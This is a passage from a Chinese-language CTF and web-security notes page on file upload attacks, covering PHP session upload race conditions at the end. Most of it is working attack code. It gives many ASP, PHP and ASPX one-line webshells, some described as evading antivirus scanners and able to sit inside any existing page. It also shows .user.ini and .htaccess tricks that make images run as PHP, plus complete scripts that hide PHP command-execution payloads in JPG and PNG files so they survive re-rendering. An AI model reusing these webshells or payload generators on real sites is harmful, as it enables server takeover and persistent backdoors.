&quot;&lt;br&gt;&quot; </span></span><br><span class="line"><span class="string">Response.Write &quot;&lt;input type=submit value=save&gt;&quot; </span></span><br><span class="line"><span class="string">Response.Write &quot;&lt;/form&gt;&quot; </span></span><br><span class="line"><span class="string">&lt;/Script&gt; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ASP一句话:&lt;%IfRequest(“1″)&lt;&gt;”&quot;ThenExecuteGlobal(Request(“1″))%&gt; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">PHP防杀放扫 一句话：&lt;?php (])?&gt; </span></span><br><span class="line"><span class="string">上面这句是防杀防扫的！网上很少人用！可以插在网页任何ASP文件的最底部不会出错，比如 </span></span><br><span class="line"><span class="string">index.asp里面也是可以的！ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">因为加了判断！加了判断的PHP一句话，与上面的ASP一句话相同道理，也是可以插在任何PHP文件 </span></span><br><span class="line"><span class="string">的最底部不会出错！&lt;?if(isset($_POST[&#x27;</span><span class="number">1</span><span class="string">&#x27;]))&#123;eval($_POST[&#x27;</span><span class="number">1</span><span class="string">&#x27;]);&#125;?&gt;&lt;?php system </span></span><br><span class="line"><span class="string">($_REQUEST[1]);?&gt; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">无防下载表，有防下载表可尝试插入以下语句突破的一句话 </span></span><br><span class="line"><span class="string">&lt;%execute request(“class”)%&gt;&lt;%&#x27;</span>&lt;% loop &lt;%:%&gt;&lt;%<span class="string">&#x27;&lt;% loop &lt;%:%&gt;&lt;%execute request </span></span><br><span class="line"><span class="string">(“class”)%&gt;&lt;%execute request(“class”)&#x27;</span>&lt;% loop &lt;%:%&gt; </span><br><span class="line"></span><br><span class="line">备份专用&lt;%<span class="keyword">eval</span>(<span class="title function_ invoke__">request</span>(“<span class="number">1</span>″)):response.end%&gt; </span><br><span class="line"></span><br><span class="line">asp一句话&lt;%<span class="title function_ invoke__">execute</span>(<span class="title function_ invoke__">request</span>(“<span class="number">1</span>″))%&gt; </span><br><span class="line">aspx一句话:&lt;scriptrunat=”server”&gt;WebAdmin2Y.x.y aaaaa =newWebAdmin2Y.x.<span class="title function_ invoke__">y</span> </span><br><span class="line">(“add6bb58e139be10″);&lt;/script&gt; </span><br><span class="line"></span><br><span class="line">可以躲过雷客图的一句话。 </span><br><span class="line">&lt;%set ms = server.<span class="title function_ invoke__">CreateObject</span>(“MSScriptControl.ScriptControl.<span class="number">1</span>″) </span><br><span class="line">ms.Language=”VBScript”ms.AddObject”Response”,Responsems.AddObject”request”, </span><br><span class="line">requestms.<span class="title function_ invoke__">ExecuteStatement</span>(“ev”&amp;”<span class="title function_ invoke__">al</span>(<span class="title function_ invoke__">request</span>(“”<span class="number">1</span>″”))”)%&gt; </span><br><span class="line"></span><br><span class="line">不用<span class="string">&#x27;&lt;,&gt;‘的asp一句话&lt;scriptrunat=server&gt;execute request(“1″)&lt;/script&gt; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">不用双引号的一句话。&lt;%eval request(chr(35))%&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#--------------------</span></span><br><span class="line"><span class="string"># 先知社区一句话木马免杀：https://xz.aliyun.com/t/9246</span></span><br><span class="line"><span class="string">#正在收集当中……</span></span><br></pre></td></tr></table></figure>



<h2 id="上传配置文件（修改配置环境）"><a href="#上传配置文件（修改配置环境）" class="headerlink" title="上传配置文件（修改配置环境）"></a>上传配置文件（修改配置环境）</h2><p><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/media/media_mimeref.asp">MIME类型</a></p>
<p>上传配置文件，属于文件上传漏洞的一种类型。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 涉及的是php文件的解析漏洞</span></span><br><span class="line"><span class="comment"># 上传配置文件，可以将上传环境的任意文件解析为php</span></span><br><span class="line">.user.ini		上传配置文件后修改的是某个文件的解析，不是修改所有文件的解析</span><br></pre></td></tr></table></figure>

<p>.user.ini文件 – nginx</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">环境：nginx</span><br><span class="line">功能：将指定文件解析为php</span><br><span class="line"></span><br><span class="line">文件名：</span><br><span class="line">.user.ini</span><br><span class="line"></span><br><span class="line">配置信息：</span><br><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=a.jpg</span><br></pre></td></tr></table></figure>

<p>.hstaccess – apache</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">适用环境：apache</span><br><span class="line">功能：将指定后缀的文件解析为php</span><br><span class="line"></span><br><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure>

<h2 id="文件上传之数据包过滤"><a href="#文件上传之数据包过滤" class="headerlink" title="文件上传之数据包过滤"></a>文件上传之数据包过滤</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.限制文件大小</span></span><br><span class="line">	(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>) &gt; <span class="number">1024</span></span><br><span class="line"><span class="comment"># 2.限制文件名</span></span><br><span class="line">	<span class="comment"># 限制文件后缀</span></span><br><span class="line">    .php .phtml .pHp .php4</span><br><span class="line"><span class="comment"># 3.限制文件类型</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] != <span class="string">&#x27;image/png&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment"># </span></span><br></pre></td></tr></table></figure>

<h2 id="文件上传其它物件"><a href="#文件上传其它物件" class="headerlink" title="文件上传其它物件"></a>文件上传其它物件</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">可能存在文件上传并且包含的标志：</span></span><br><span class="line">/upload/download.php?file=2eaa7cebaf94009ea6f40c3841dca980.zip</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">某个特殊的文件头</span></span><br><span class="line">Content-Type: application/x-zip-compressed</span><br></pre></td></tr></table></figure>

<h3 id="jpg二次渲染脚本"><a href="#jpg二次渲染脚本" class="headerlink" title="jpg二次渲染脚本"></a>jpg二次渲染脚本</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&#x27;&lt;?=system(&quot;cat f*&quot;);?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="comment">//die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;);</span></span><br><span class="line">        <span class="variable">$argv</span>[<span class="number">1</span>] = <span class="string">&#x27;1.jpg&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> =</span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) .</span><br><span class="line">                    <span class="variable">$miniPayload</span> .</span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) .</span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> =</span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) .</span><br><span class="line">                        <span class="variable">$miniPayload</span> .</span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) .</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                	<span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> 作者：J_Chanra https:<span class="comment">//www.bilibili.com/read/cv17496404/ 出处：bilibili</span></span><br></pre></td></tr></table></figure>

<p>使用方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php web146-3.php 1.jpg</span><br></pre></td></tr></table></figure>





<h3 id="png二次渲染脚本"><a href="#png二次渲染脚本" class="headerlink" title="png二次渲染脚本"></a>png二次渲染脚本</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">图片包含的木马是：&lt;?=$_GET[0]($_POST[1]);?&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>使用方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php web.php</span><br></pre></td></tr></table></figure>











<h2 id="文件上传之条件竞争"><a href="#文件上传之条件竞争" class="headerlink" title="文件上传之条件竞争"></a>文件上传之条件竞争</h2><h3 id="Session条件竞争"><a href="#Session条件竞争" class="headerlink" title="Session条件竞争"></a>Session条件竞争</h3><p>源头：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
<p>wp：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45696568/article/details/114445971">https://blog.csdn.net/weixin_45696568/article/details/114445971</a></p>
<blockquote>
<p><strong>本文主要是利用PHP中的<code>session.upload_progress</code>功能作为跳板，从而进行文件包含和反序列化漏洞利用。由于首先需要了解关于session及其反序列化等相关的知识，所以对它们先进行介绍。有不对的地方，欢迎各位大佬指正。</strong></p>
</blockquote>
<h4 id="php中的session-upload-progress"><a href="#php中的session-upload-progress" class="headerlink" title="php中的session.upload_progress"></a>php中的session.upload_progress</h4><p>版本： <code>&gt;= php 5.4  php.ini文件</code> 前四个配置为主。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">session.upload_progress.enabled = on</span><br><span class="line">session.upload_progress.cleanup = on</span><br><span class="line">session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">session.upload_progress.freq = &quot;1%&quot;</span><br><span class="line">session.upload_progress.min_freq = &quot;1&quot;</span><br></pre></td></tr></table></figure>

<h3 id="Session相关信息：web82"><a href="#Session相关信息：web82" class="headerlink" title="Session相关信息：web82~?"></a>Session相关信息：web82~?</h3><blockquote>
<p>参考自此师傅的文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9545">https://xz.aliyun.com/t/9545</a></p>
</blockquote>
<h4 id="前置信息"><a href="#前置信息" class="headerlink" title="前置信息"></a>前置信息</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">存储位置：</span></span><br><span class="line">phpinfo反馈关键字段： session.save_path</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#默认路径</span></span></span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sessions/sess_PHPSESSID #未设置时的存储位置</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#默认文件名格式</span></span></span><br><span class="line">sess_SESSIONID</span><br><span class="line">sess_ : 默认前缀</span><br><span class="line">SESSIONID: 使用的时候生成的随机字符串</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## 而般情况下，phpmyadmin的session文件会设置在/tmp目录下，</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## 需要在php.ini里把session.auto_start置为1，</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## 把session.save_path目录设置为/tmp。</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">与SESSION相关的PHP配置项</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#session.auto_start：</span></span></span><br><span class="line">如果开启这个选项，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。</span><br><span class="line">但默认情况下，也是通常情况下，这个选项都是默认关闭的。</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#session.upload_progress.cleanup = on：</span></span></span><br><span class="line">表示当文件上传结束后，php将会立即清空对应session文件中的内容。</span><br><span class="line">该选项默认开启</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#session.use_strict_mode：</span></span></span><br><span class="line">默认情况下，该选项的值是0，此时用户可以自己定义Session ID。</span><br></pre></td></tr></table></figure>

<h4 id="Session-Upload-Progress"><a href="#Session-Upload-Progress" class="headerlink" title="Session Upload Progress"></a>Session Upload Progress</h4><p>直译：Session 上传进度</p>
